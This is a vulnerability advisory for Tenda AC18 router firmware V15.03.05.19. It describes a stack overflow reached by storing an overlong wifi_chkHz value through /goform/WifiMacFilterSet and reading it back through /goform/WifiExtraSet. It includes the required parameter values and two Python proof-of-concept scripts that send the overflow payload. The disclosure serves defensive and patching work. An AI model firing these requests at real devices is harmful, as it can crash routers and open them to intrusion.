## Overview

- The device's official website: https://www.tenda.com.cn/product/A18.html
- Firmware download website: https://www.tenda.com.cn/material/show/2683

## Affected version

V15.03.05.19(6318)

## Vulnerability details

In the TendaAC18 Firmware has a stack overflow vulnerability in the `/goform/WifiMacFilterSet` url. The `Var` variable receives the `wifi_chkHz` parameter from a POST request and is stored in the configuration item named`wl.bcm11ac` through the SetValue function.To run to this branch, the value of the `ssid_index` parameter needs to be set to 1 and the value of the `filter_mode` parameter needs to be set to 1.

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20250928_125253.png)

`wl.bcm11ac`  configuration item can  be retrieved through the GetValue function in the `/goform/WifiExtraSet` url.However, neither the GetValue function nor the SetValue function impose any restrictions on the length of variables, which can lead to stack overflows by the `v10` variable.To run to this branch, the value of the `wl_mode` parameter needs to be set to ap.

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20250928_125931.png)

## PoC

Set `wl.bcm11ac`

```python
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/WifiMacFilterSet"
payload = "a"*1000

data = {"wifi_chkHz":payload,"ssid_index":1,"filter_mode":1}
response = requests.post(url, data=data)
print(response.text)
```

Get `wl.bcm11ac`

```python
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/WifiExtraSet"
data = {"wl_mode":"ap"}
response = requests.post(url, data=data)
print(response.text)
```

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20250926141817071.png)